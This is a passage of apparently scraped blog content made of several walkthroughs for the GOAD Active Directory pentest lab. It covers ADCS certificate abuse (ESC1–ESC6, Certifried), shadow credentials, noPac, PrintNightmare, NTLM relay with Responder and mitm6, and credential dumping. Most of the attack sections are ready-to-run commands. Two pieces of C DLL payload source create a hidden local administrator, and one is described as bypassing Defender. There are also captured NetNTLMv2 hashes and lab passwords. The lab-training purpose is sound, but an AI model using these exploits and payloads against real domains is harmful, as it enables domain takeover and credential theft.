khal.drogo@essos.local -p &#39;horse&#39; -dc-ip 192.168.56.12 This will search the certificate server, and dump all the information needed in three format : bloodhound : a zip ready to import in bloodhound (if you use certipy 4.0 you will have to install the bloodhound gui modified by oliver lyak, if you do not want to use the modified version, you must use the -old-bloodhound option) json : information json formated txt : a textual format Certipy 4.0 reintroduce also the -vulnerable option to show the vulnerable templates.certipy find -u khal.drogo@essos.local -p &#39;horse&#39; -vulnerable -dc-ip 192.168.56.12 -stdout We can find an ESC1 vulnerable template : Enrollment rights to all domain users Client authentication And Enrollee supplies subject There is also an ESC2 vulnerable template:And others vulnerable templates, let’s take a look in bloodhound.cd /opt/toolswget https://github.com/ly4k/BloodHound/releases/download/v4.2.0-ly4k/BloodHound-linux-x64.zipunzip BloodHound-linux-x64.zip -d BloodHound4.2-ly4krm BloodHound-linux-x64.zipneo4j start/opt/tools/BloodHound4.2-ly4k/BloodHound-linux-x64/BloodHound --no-sandbox --disable-dev-shm-usage Import the zip file created with certipy. And take an overview with : PKI-&amp;gt;Find certificate authority, select the certificate authority and click : “see enabled templates” if you don’t have esc4 setup on the lab, please update and run the following commands: ansible-playbook acl.yml ansible-playbook adcs.yml and next rerun bloodhound and certipy :) Now you should be ok with acl and adcs ESC4 settings :)ADCS - exploitationADCS - ESC1 enumeratecertipy find -u khal.drogo@essos.local -p &#39;horse&#39; -dc-ip 192.168.56.12 query the certificate target : the ca server tempalte : the vulnerable template upn : the target user we want to impersonate certipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local authentication with the pfx we request beforecertipy auth -pfx administrator.pfx -dc-ip 192.168.56.12 if you get the error : “[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)”, the lab is in error, i don’t know why sometimes it is not working by now, but you can reboot DC3 to fix this: vagrant reload DC03ADCS - ESC2 &amp;amp; ESC3 As said in the certipy page : “ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates.” Let’s distinguish the 2 attacks by trying with ESC2 : Query certcertipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target 192.168.56.23 -template ESC2 -ca ESSOS-CA Query cert with the Certificate Request Agent certificate we get before (-pfx)certipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of &#39;essos\\administrator&#39; -pfx khal.drogo.pfx Authcertipy auth -pfx administrator.pfx -dc-ip 192.168.56.12 We also can do the same with the ESC3-CRA and ESC3 templates in the lab :certipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target 192.168.56.23 -template ESC3-CRA -ca ESSOS-CAcertipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target 192.168.56.23 -template ESC3 -ca ESSOS-CA -on-behalf-of &#39;essos\\administrator&#39; -pfx khal.drogo.pfxcertipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 192.168.56.12ADCS - ESC4 Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)certipy template -u khal.drogo@essos.local -p &#39;horse&#39; -template ESC4 -save-old -debug Exploit ESC1 on the modified ESC4 templatecertipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local authentication with the pfxcertipy auth -pfx administrator.pfx -dc-ip 192.168.56.12 Rollback the template configuration certipy template -u khal.drogo@essos.local -p &#39;horse&#39; -template ESC4 -configuration ESC4.json ADCS - ESC6 As said on certipy page : “ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration.” Because ESSOS-CA is vulnerable to ESC6 we can do the ESC1 attack but with the user template instead of the ESC1 template even if the user template got Enrollee Supplies Subject set to false. certipy req -u khal.drogo@essos.local -p &#39;horse&#39; -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.localcertipy auth -pfx administrator.pfx -dc-ip 192.168.56.12 If you need to disable the EDITF_ATTRIBUTESUBJECTALTNAME2 attribute (because you want to try without it or just because this attack will no longer work on a up to date AD without esc10 vuln), you could do as administrator on braavos the following commands:certutil –setreg policy\\EditFlags –EDITF_ATTRIBUTESUBJECTALTNAME2net stop certsvc &amp;amp;&amp;amp; net start certsvc This also mean that if you got an administrator access on the certificate server you can change this attribute to exploit ESC1 without being domain admin ;) But now the exploit ESC6 no longer work, the user is not changed :)Certifried - CVE-2022–26923 Oliver Lyak found out a way to escalate privilege as a low privilege user into an active directory.This consist of change the dnsHostName property on a created computer. The idea look the same as samAccountName vulnerability, it is a confusion with name on authentication. Details are here :https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4 Create an account with a domain user and set a fake dns name as the domain controler. certipy account create -u khal.drogo@essos.local -p &#39;horse&#39; -user &#39;certifriedpc&#39; -pass &#39;certifriedpass&#39; -dns &#39;meereen.essos.local&#39; Request a certificate with the created computer on template Machinecertipy req -u &#39;certifriedpc$&#39;@essos.local -p &#39;certifriedpass&#39; -target braavos.essos.local -ca ESSOS-CA -template Machine Authenticate with the certificate as meereen (the dc)certipy auth -pfx meereen.pfx -username &#39;meereen$&#39; -domain essos.local -dc-ip 192.168.56.12 Dump the ndts with the kerberos ticket we just getexport KRB5CCNAME=/workspace/certifried/meereen.ccachesecretsdump -k -no-pass -just-dc-user daenerys.targaryen ESSOS.LOCAL/&#39;meereen$&#39;@meereen.essos.local delete the created computer with a domain admin usercertipy account delete -u daenerys.targaryen@essos.local -hashes &#39;aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a&#39; -user &#39;certifriedpc&#39; Ok but now imagine you can’t dcsync with secretdump due to a security product on the dc, or you just want to get a shell directly on the DC. Let’s try to get a shell. We got the TGT of the DC (exactly like in part 5 for samaccountname) so we will use impacket getST to impersonate the administrator and get a st to access the DC as administrator (see : https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse) remember to use the good impacket pull request to use this, see part5 for installation (thx again to shutdown for the adds to impacket)export KRB5CCNAME=/workspace/certifried/meereen.ccachepython3 /opt/tools/myimpacket/examples/getST.py -self -impersonate &#39;administrator&#39; -altservice &#39;CIFS/meereen.essos.local&#39; -k -no-pass -dc-ip &#39;meereen.essos.local&#39; &#39;essos.local&#39;/&#39;meereen&#39; and now we can use our ticketexport KRB5CCNAME=/workspace/certifried/administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccachewmiexec.py -k @meereen.essos.local We could also do the same thing but with winrm to be even more legit :)export KRB5CCNAME=/workspace/certifried/meereen.ccachepython3 /opt/tools/myimpacket/examples/getST.py -self -impersonate &#39;administrator&#39; -altservice &#39;HTTP/meereen.essos.local&#39; -k -no-pass -dc-ip &#39;meereen.essos.local&#39; &#39;essos.local&#39;/&#39;meereen&#39; Note : Here we asked an altservice HTTP/meereen.essos.local for winrm usageexport KRB5CCNAME=/workspace/certifried/administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccacheevil-winrm -i meereen.essos.local -r ESSOS.LOCAL and voilà :)Shadow Credentials Shadow credentials attack consist of using the GenericAll or GenericWrite privilege on a user or computer to set up the attribute msDS-KeyCredentialLink. explanations here You can get the dacl movement on shutdown (@_nwodtuhs) website, the hacker recipes : https://www.thehacker.recipes/ad/movement/dacl This attack is very usefull when you got Write on another user. With genericWrite you can only do: Target Kerberoasting : add an SPN to a user, do a kerberoasting, unset the spn. But the user password must be weak to the kerberoasting attack work. Set up a logon script : change ldap parameters to set up a logon script. but it implies that the user log to his computer, an smb server or a share to offer the script and setup a script that bypass the security solutions in place) shadow credentials : the attack we want to do, we need a cetificate service on the domain With GenericAll you can : ForceChangePassword : but on a real pentest you don’t want to block a user by changing his password. And this is not very stealthy too. So if you can do another way this is fine :) All the attacks available in the genericWrite part. So if ADCS is enabled on the domain, and we got write privilege on msDS-KeyCredentialLink, we can do the shadow credentials attack to get a direct access on the user account. And this seems to be the better idea in this case on a real pentest. Shadow credentials is now include with certipy (this attack can also be done with pywisker )certipy shadow auto -u khal.drogo@essos.local -p &#39;horse&#39; -account &#39;viserys.targaryen&#39; And we can do the same from viserys to jorahcertipy shadow auto -u viserys.targaryen@essos.local -hashes &#39;d96a55df6bef5e0b4d6d956088036097&#39; -account &#39;jorah.mormont&#39;Next time we will have fun with MSSQL (Goad pwning part7) in the lab :)" }, { "title": "GOAD - part 5 - exploit with user", "url": "/posts/GOADv2-pwning-part5/", "categories": "AD", "tags": "AD,, Lab,, samaccountname,, nopac,, printnightmare", "date": "2022-07-20 00:00:00 +0200", "snippet": "In the previous post (Goad pwning part4) we played with relay ntlm.During this article we will continue to discover what can be done using a valid domain accountHere we will only try samAccountName exploit and PrintNightmare as MS14-068 is now too old (Windows Server 2012 R2 max).SamAccountName (nopac)In the end of 2021 when everyone was worried about the log4j “log4shell” vulnerability another vulnerability raise up with less noise : CVE-2021-42287. I will not re-explain the vulnerability, as it is wonderfully describe here by Charlie Clark : https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html The attack was automated on windows by cube0x0 : https://github.com/cube0x0/noPac And on linux by shutdown : https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing (still in impacket pull requests : https://github.com/SecureAuthCorp/impacket/pull/1202 and https://github.com/SecureAuthCorp/impacket/pull/1224) As a huge fan of linux and exegol we will try the linux way :)Check if we can add computerFor this attack i will use north/jon.snow:iknownothing account as we previously get it with kerberoasting in the part3.Let’s find a cme module to check the machine account quotacme ldap -Lcme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQPrepare ImpacketBefore exploiting with impacket let’s prepare our impacket version with the pull request we want. Clone the impacket repocd /opt/toolsgit clone https://github.com/SecureAuthCorp/impacket myimpacket Create our branchcd myimpacketgit checkout -b mydev Create a venv to don’t interfer with the host environment and install the repository we just checkoutpython3 -m virtualenv myimpacketsource myimpacket/bin/activatepython3 -m pip install . Get the waiting pull requests we want (You can find a huge list of nice PR to merge in exegol install script : https://github.com/ShutdownRepo/Exegol-images/blame/main/sources/install.sh#L286 )git fetch origin pull/1224/head:1224git fetch origin pull/1202/head:1202 Merge the pull requests to our branchgit merge 1202git merge 1224 Reorder the path entry result to load our pyenv bin before the others in the $PATH (this is needed on zsh, in bash it take directly our pyenv bins)rehash Now let’s check we get all the binaries and options we want :renameMachine.pygetST.py Excellent, we are now using the latest impacket version with Shutdown (@_nwodtuhs) pull requests needed for this attack :)ExploitWhat we will do is add a computer, clear the SPN of that computer, rename computer with the same name as the DC,obtain a TGT for that computer, reset the computer name to his original name, obtain a service ticket with the TGT we get previously and finally dcsync :) Add a new computeraddcomputer.py -computer-name &#39;samaccountname$&#39; -computer-pass &#39;ComputerPassword&#39; -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH &#39;north.sevenkingdoms.local/jon.snow:iknownothing&#39; Clear the SPNs of our new computer (with dirkjan krbrelayx tool addspn)addspn.py --clear -t &#39;samaccountname$&#39; -u &#39;north.sevenkingdoms.local\\jon.snow&#39; -p &#39;iknownothing&#39; &#39;winterfell.north.sevenkingdoms.local&#39; Rename the computer (computer -&amp;gt; DC)renameMachine.py -current-name &#39;samaccountname$&#39; -new-name &#39;winterfell&#39; -dc-ip &#39;winterfell.north.sevenkingdoms.local&#39; north.sevenkingdoms.local/jon.snow:iknownothing Obtain a TGTgetTGT.py -dc-ip &#39;winterfell.north.sevenkingdoms.local&#39; &#39;north.sevenkingdoms.local&#39;/&#39;winterfell&#39;:&#39;ComputerPassword&#39; Reset the computer name back to the original namerenameMachine.py -current-name &#39;winterfell&#39; -new-name &#39;samaccount$&#39; north.sevenkingdoms.local/jon.snow:iknownothing Obtain a service ticket with S4U2self by presenting the previous TGTexport KRB5CCNAME=/workspace/winterfell.ccachegetST.py -self -impersonate &#39;administrator&#39; -altservice &#39;CIFS/winterfell.north.sevenkingdoms.local&#39; -k -no-pass -dc-ip &#39;winterfell.north.sevenkingdoms.local&#39; &#39;north.sevenkingdoms.local&#39;/&#39;winterfell&#39; -debug DCSync by presenting the service ticketexport KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccachesecretsdump.py -k -no-pass -dc-ip &#39;winterfell.north.sevenkingdoms.local&#39; @&#39;winterfell.north.sevenkingdoms.local&#39; And voilà, we got all the north domain ntds.dit informations :) Now clean up by deleting the computer we created with the administrator account hash we just get addcomputer.py -computer-name &#39;samaccountname$&#39; -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes &#39;aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4&#39; &#39;north.sevenkingdoms.local/Administrator&#39;Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation[*] Successfully deleted samaccountname$.PrintNightmareTo exploit printnightmare we will first check if the spooler is active on targetsCheck spooler is active With cmecme smb 192.168.56.10-23 -M spooler With impacket rpcdumprpcdump.py @192.168.56.10 | egrep &#39;MS-RPRN|MS-PAR&#39;Prepare impacket To exploit with cube0x0 script you no longer need the modified impacket version as the modifications as been merged in the main project: https://github.com/SecureAuthCorp/impacket/pull/1114 https://github.com/SecureAuthCorp/impacket/pull/1109 Prepare the dll Let’s prepare the exploitation dll We will create a user and add it as local administrator Create the file nightmare.c:#include &amp;lt;windows.h&amp;gt; int RunCMD(){ system(&quot;net users pnightmare Passw0rd123. /add&quot;); system(&quot;net localgroup administrators pnightmare /add&quot;); return 0;}BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: RunCMD(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} Compile it:x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.cExploit on old and vulnerable windows server 2016 (meereen) Clone the exploitgit clone https://github.com/cube0x0/CVE-2021-1675 printnightmare Prepare a smb share with the dllsmbserver.py -smb2support ATTACKERSHARE . Before the exploit no user pnightmare Try on Braavos Braavos is an up-to-date windows server 2016, the exploit will not work (same error if you try on the north domain on castelblack server) Exploit on Meereenpython3 CVE-2021-1675.py essos.local/jorah.mormont:&#39;H0nnor!&#39;@meereen.essos.local &#39;\\\\192.168.56.1\\ATTACKERSHARE\\nightmare.dll&#39; The exploit worked Wait, you use domain connection instead of –local-auth with cme no ? Yes, this is because meereen is a domain controler:“Domain controllers do not have built-in or account domains. Also, instead of a SAM database, these systems use the Microsoft Active Directory directory service to store account access information.” see: https://docs.microsoft.com/en-us/windows/win32/secmgmt/built-in-and-account-domainsExploit on vulnerable windows server 2019 (winterfell) Now try the same exploit on a vulnerable windows server 2019python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:&#39;iknownothing&#39;@north.sevenkingdoms.local &#39;\\\\192.168.56.1\\ATTACKERSHARE\\nightmare.dll&#39; And it works too but the user is not in the administrators group :( Nothing due to the exploit, it is just our dll who add a user as administrator who get caught when user is setup as administrator Good (thing) to know : after some failures the spooler service will be stopped by defender and no more exploit for you until someone restart the server or the spooler service. Let’s change the payload with another code (source : https://github.com/newsoft/adduser ) /* * ADDUSER.C: creating a Windows user programmatically. */#define UNICODE#define _UNICODE#include &amp;lt;windows.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;lmaccess.h&amp;gt;#include &amp;lt;lmerr.h&amp;gt;#include &amp;lt;tchar.h&amp;gt;DWORD CreateAdminUserInternal(void){ NET_API_STATUS rc; BOOL b; DWORD dw; USER_INFO_1 ud; LOCALGROUP_MEMBERS_INFO_0 gd; SID_NAME_USE snu; DWORD cbSid = 256; // 256 bytes should be enough for everybody :) BYTE Sid[256]; DWORD cbDomain = 256 / sizeof(TCHAR); TCHAR Domain[256]; // Create user memset(&amp;amp;ud, 0, sizeof(ud)); ud.usri1_name = _T(&quot;pnightmare2&quot;); // username ud.usri1_password = _T(&quot;Test123456789!&quot;); // password ud.usri1_priv = USER_PRIV_USER; // cannot set USER_PRIV_ADMIN on creation ud.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT; // must be set ud.usri1_script_path = NULL; rc = NetUserAdd( NULL, // local server 1, // information level (LPBYTE)&amp;amp;ud, NULL // error value ); if (rc != NERR_Success) { _tprintf(_T(&quot;NetUserAdd FAIL %d 0x%08x\\r\\n&quot;), rc, rc); return rc; } _tprintf(_T(&quot;NetUserAdd OK\\r\\n&quot;), rc, rc); // Get user SID b = LookupAccountName( NULL, // local server ud.usri1_name, // account name Sid, // SID &amp;amp;cbSid, // SID size Domain, // Domain &amp;amp;cbDomain, // Domain size &amp;amp;snu // SID_NAME_USE (enum) ); if (!b) { dw = GetLastError(); _tprintf(_T(&quot;LookupAccountName FAIL %d 0x%08x\\r\\n&quot;), dw, dw); return dw; } // Add user to &quot;Administrators&quot; local group memset(&amp;amp;gd, 0, sizeof(gd)); gd.lgrmi0_sid = (PSID)Sid; rc = NetLocalGroupAddMembers( NULL, // local server _T(&quot;Administrators&quot;), 0, // information level (LPBYTE)&amp;amp;gd, 1 // only one entry ); if (rc != NERR_Success) { _tprintf(_T(&quot;NetLocalGroupAddMembers FAIL %d 0x%08x\\r\\n&quot;), rc, rc); return rc; } return 0;}//// DLL entry point.//BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: CreateAdminUserInternal(); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;}// RUNDLL32 entry point#ifdef __cplusplusextern &quot;C&quot; {#endif__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow){ CreateAdminUserInternal();}#ifdef __cplusplus}#endif// Command-line entry point.int main(){ return CreateAdminUserInternal();} with this payload we can bypass defender and add our user as administrator compilex86_64-w64-mingw32-gcc -shared -opnightmare2.dll adduser.c -lnetapi32 prepare the sharesmbserver.py -smb2support ATTACKERSHARE . relaunch the exploitpython3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:&#39;iknownothing&#39;@winterfell.north.sevenkingdoms.local &#39;\\\\192.168.56.1\\ATTACKERSHARE\\pnightmare2.dll&#39; And enjoy your new admin account by dumping the ntds :)cme smb winterfell.north.sevenkingdoms.local -u pnightmare2 -p &#39;Test123456789!&#39; --ntdscleanup After the exploitation you will find your dlls inside : C:\\Windows\\System32\\spool\\drivers\\x64\\3 And also inside : C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\{id}\\ Don’t forget to clean up ;)Next time we will have fun with ADCS (Certifried, ESC1, ESC8, …) : : Goad pwning part6" }, { "title": "GOAD - part 4 - poison and relay", "url": "/posts/GOADv2-pwning-part4/", "categories": "AD", "tags": "AD,, Lab,, responder,, mitm6,, ntlm, relay", "date": "2022-07-12 00:00:00 +0200", "snippet": "In the previous post (Goad pwning part3) we start to dig on what to do when you got a user account. Before start exploiting the VMs with a user account, we will just step back to the state (without user account) and see what we can do with responder, mitm6 and NTLM relay !ResponderWhen you start a pentest without any creds, responder is a must run tool.In a standard windows active directory (without any modification) It will give you : usernames netntlmv1 (if the server is very old) / netntlmv2 hashes the ability to redirect the authentication (NTLM relay) …In the lab, there are two bots to simulate LLMRN, MDNS and NBT-NS requests. One user has a weak password but no admin right. Another user has admin rights but uses a strong password.Let start responder to see if we can get some informations.responder -I vboxnet0Some minutes later we will get robb.stark netntlmv2 hash The bot try to make a smb connection to bravos instead of braavos. The dns doesn’t know bravos without two ‘a’ so by default windows will send a broadcast request to find the associated computer. With responder we answer to that broadcast query and say that this server is us, and so we get the connection from the user.After some more minutes (eddard bot is set to run every 5 minutes and robb every 3 minutes) we got also a connection from eddard.stark: The netntlm hashes are not usable to do pass the hash, but you can crack them to retrieve the password. We create a file responder.hashes with the two hashes found and we will start to crack it with hashcat. robb.stark::NORTH:1122334455667788:138B29A14C5A082F19F946BB3AFF537E:01010000000000000090C5E56494D801E5D2F5789054B95D0000000002000800480053003600340001001E00570049004E002D004C00420052004E0041004D0031005300540051005A0004003400570049004E002D004C00420052004E0041004D0031005300540051005A002E0048005300360034002E004C004F00430041004C000300140048005300360034002E004C004F00430041004C000500140048005300360034002E004C004F00430041004C00070008000090C5E56494D801060004000200000008003000300000000000000000000000003000002D4B5557B9EF589ECE5944B06785A55D686F279D120AC87BCBF6D0FEAA6663B90A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000eddard.starkhashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt We quickly get another user account robb.stark:sexywolfy. This is enough to pwn the north domain as robb is an administrator of winterfell (the north dc). Eddard’s password is stronger and cannot be break with this method. This doesn’t mean we can do nothing. What we could do is relay eddard connection to a server where smb is not signed ;) Responder keep the logs in /opt/tools/Responder/logs (on exegol), if you need to show them again.NTLM relayUnsigned SMBLet’s start hunting unsigned smb in the lab and generate a list of IP targets.cme smb 192.168.56.10-23 --gen-relay-list relay.txtOk now we got a list of signing:False smb computers, we can start to try to relay ntlm authentication to them.responder + ntlmrelayx to smbBefore starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.sed -i &#39;s/HTTP = On/HTTP = Off/g&#39; /opt/tools/Responder/Responder.conf &amp;amp;&amp;amp; cat /opt/tools/Responder/Responder.conf | grep --color=never &#39;HTTP =&#39;sed -i &#39;s/SMB = On/SMB = Off/g&#39; /opt/tools/Responder/Responder.conf &amp;amp;&amp;amp; cat /opt/tools/Responder/Responder.conf | grep --color=never &#39;SMB =&#39;Next, we start ntlmrelayxntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks -tf : list of targets to relay the authentication -of : output file, this will keep the captured smb hashes just like we did before with responder, to crack them later -smb2support : support for smb2 -socks : will start a socks proxy to use relayed authenticationThe program send back this error :Type help for list of commands self._target(*self._args, **self._kwargs) File &quot;/usr/local/lib/python3.10/dist-packages/impacket/examples/ntlmrelayx/servers/socksserver.py&quot;, line 247, in webService from flask import Flask, jsonify File &quot;/usr/local/lib/python3.10/dist-packages/flask/__init__.py&quot;, line 19, in &amp;lt;module&amp;gt; from jinja2 import Markup, escapeImportError: cannot import name &#39;Markup&#39; from &#39;jinja2&#39; (/usr/local/lib/python3.10/dist-packages/jinja2/__init__.py)let’s fix it :pip3 install Flask Jinja2 --upgrade Relaunch ntlmrelayx, fine it work :)ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks Start responder to redirect queries to the relay serverresponder -I vboxnet0 The poisoned connections are relayed to castelblack (192.168.56.22) and essos (192.168.56.23) and a socks proxy is setup to use the connection. As eddard.stark is a domain administrator of north.sevenkingdoms.local he got administrator privileges on castelback.Now we can use this relay to get an access to the computer as an administratorUse a socks relay with an admin accountSecretsdump Use secretsdump to get SAM database, LSA cached logon, machine account and some DPAPI informationsproxychains secretsdump -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; The sam database contains the local accounts. We will ignore vagrant as it is the default user to setup the lab. The important information here is the NT hash of the local administrator user. We also got the LSA cache of the last connected users (by default windows keep the last 10 users), this is useful to connect to the server even if the domain controller is unreachable. But those cached credentials can be cracked offline with hashcat (very slow). And to finish we also got the hash of the computer account. (Sometimes you will get no useful domain accounts or no information at all on a domain joined computer but if you get this hash you got an account on the domain!) With a machine account you can query the ldap like any other users and you can also run bloodhound ingestor ;)Lsassy Use lsassy to get the lsass process stored credentials Domain accounts informations are stored in the LSASS process so make a dump of this process can give you more domain accounts and privileges. Lsassy allow you to dump lsass remotely (very more convenient then doing a procdump, download of the lsass dump file and doing pypykatz or mimikatz locally), it do all the painful actions like dump and read lsass content for you (it also dump only the usefull part of the lsass dump optimizing the time of transfer). (lsassy also exist as a cme module)proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22DonPapi My third favorite tool to retreive secrets of windows with linux is donPAPI, it is used to get dpapi and other passwords stored informations (files, browser, schedule tasks,…). This tool don’t touch LSASS so it is stealthier and work most of the time even if av and edr are enabled on the target.proxychains DonPAPI -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; DonPapi give us the stored password for the sql service sql_svc:YouWillNotKerboroast1ngMeeeeee We also get the password of robb.stark due to a scheduled task setup on this computer too. Smbclient Connect directly to the smbserver with smbclientproxychains smbclient.py -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; -debugCode execution : smbexec or atexec With a socks connection you can only use smbexec or atexec. Neither wmiexec, psexec nor dcomexec will work.(explainations here : https://github.com/SecureAuthCorp/impacket/issues/412 )proxychains smbexec.py -no-pass &#39;NORTH&#39;/&#39;EDDARD.STARK&#39;@&#39;192.168.56.22&#39; -debugMitm6 + ntlmrelayx to ldapAnother useful way to poison the network is by giving answer to DHCPv6 requests and setting our host as the default DNS server.Windows by default prefers IPv6 over IPv4 so we could capture and poison the response to DHCPv6 query to change the DNS server and redirect queries to our machine with the tool MITM6. We will start mitm6 to poison dhcpv6 and get dns request from the hosts As a side note, i notice we can poison domain controler but after that the DC’s doesn’t care and still use their localhost dns server. So we must target servers For this example we will poison braavos server. We will answer to wpad queries and relay the http query to ldaps on meereen to add a computer with delegate access. ~First we need to make small changes on braavos.local network configuration~ (Edit: Not needed anymore if you did the ansible provisioning after 08/18/2022) Connect to braavos with khal.drogo:horse on rdp and change the dns server of the ethernet to automatic (i will fix that in the ansible lab playbooks soon but for now you will have to do that by hand). Change only the first ethernet connection to automatic dns. start poisoning with mitm6 and start ntlmrelayxmitm6 -i vboxnet0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debugntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer relayedpccreate --delegate-access As we can see the dns is now poisonned We wait for a wpad http query to relay the request to the ldaps (you can reboot the VM to poison and exploit without waiting) A new computer has been created with delegate access to Braavos$ because we poison Braavos$ computer account and it can set the msDS-AllowedToActOnBehalfOfOtherIdentity on the created computer. And we can continue with RBCD exploitation just like in the next paragraph (with getST to call s4u2proxy) If we specify a loot dir all the informations on the ldap are automatically dumped ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot Open an rdp with essos.local/khal.drogo:horse When the relay is up and running we can get all the domain information Another thing we could do is also relay to smb server just like what we did with responder (but there is no bot for now to do it so you have to do the poisoned victim)Coerced auth smb + ntlmrelayx to ldaps with drop the micWe can coerce a connection from meereen DC to our host using multiple methods (petitpotam, printerbug, DFSCoerce).To force a coerce without choosing between the different methods, we can use the all-in-one tool who just came up coercerAs explained beautifully in the hackndo blog (en.hackndo.com/ntlm-relay) and in the hacker receipe (www.thehacker.recipes/ad/movement/ntlm/relay), you can’t relay smb connection to ldap(s) connection without using CVE-2019-1040 a.k.a remove-mic. Start the relay with remove mic to the ldaps of meereen.essos.local.ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1 The attack worked we can now exploit braavos with RBCDgetST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 &#39;ESSOS.LOCAL/removemiccomputer$:_53&amp;gt;W3){OkTY{ej&#39; and use that ticket to retreive secretsexport KRB5CCNAME=/workspace/Administrator.ccachesecretsdump -k -no-pass ESSOS.LOCAL/&#39;Administrator&#39;@braavos.essos.localNext time we will go back to the exploitation with a user account part (samccountname, printnightmare) : Goad pwning part5" }, { "title": "GOAD - part 3 - enumeration with user", "url": "/posts/GOADv2-pwning-part3/", "categories": "AD", "tags": "AD,, Lab,, cme,, kerberoasting,, impacket,, ldap,, bloodhound", "date": "2022-07-07 00:00:00 +0200", "snippet": "We found some users on Goad pwning part2, now let see what we can do with those creds.User listing When you get an account on an active directory, the first thing to do is always getting the full list of users. Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Querying north.sevenkingdoms.local for information about domain.Name Email PasswordLastSet LastLogon -------------------- ------------------------------ ------------------- -------------------Administrator 2022-06-29 00:32:20.901897 2022-07-01 17:48:41.983605 Guest &amp;lt;never&amp;gt; &amp;lt;never&amp;gt; vagrant 2021-05-12 13:38:55.922520 2022-07-01 12:08:35.223885 krbtgt 2022-06-29 00:48:58.950440 &amp;lt;never&amp;gt; arya.stark 2022-06-29 07:48:08.060667 2022-07-03 17:40:06.721358 eddard.stark 2022-06-29 07:48:11.560625 2022-07-04 23:33:27.976702 catelyn.stark 2022-06-29 07:48:15.013735 &amp;lt;never&amp;gt; robb.stark 2022-06-29 07:48:18.544972 2022-07-04 23:35:50.678794 sansa.stark 2022-06-29 07:48:21.607059 &amp;lt;never&amp;gt; brandon.stark 2022-06-29 07:48:24.278459 2022-07-04 23:36:08.991489 rickon.stark 2022-06-29 07:48:26.966809 &amp;lt;never&amp;gt; hodor 2022-06-29 07:48:29.670052 2022-07-04 